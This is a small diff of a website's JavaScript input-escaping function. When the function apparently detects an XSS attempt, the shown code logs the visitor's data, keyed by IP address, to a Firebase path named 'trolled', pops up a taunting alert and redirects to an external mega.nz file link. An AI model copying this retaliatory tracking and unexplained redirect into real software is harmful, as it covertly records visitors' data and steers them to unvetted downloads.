@@ -33,9 +33,10 @@ function _w(param) {
 				firebase.database().ref("trolled/").update({ [data["ip"].replace(/\./g, "-")]: JSON.stringify(data, null, 2) })
 				// console.log(JSON.stringify(data, null, 2));
 			});
-			for (var i = 0; i < Math.floor(Math.random() * 5000) + 1000; i++) {
-				console.log("Please stop trying your XSS Attempts :-( I WannaCry");
-			}
+			// for (var i = 0; i < Math.floor(Math.random() * 5000) + 1000; i++) {
+			// 	console.log("Please stop trying your XSS Attempts :-( I WannaCry");
+			// }
+			alert("Please stop trying your XSS Attempts :-( I WannaCry");
 			window.location.replace("https://mega.nz/#!uJ0EzIRI!llXqRzR1SF4Lwr0LiA81tPifdsJktVs9TxqFNXT-HWY");
 	}
 	ret = param.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");	
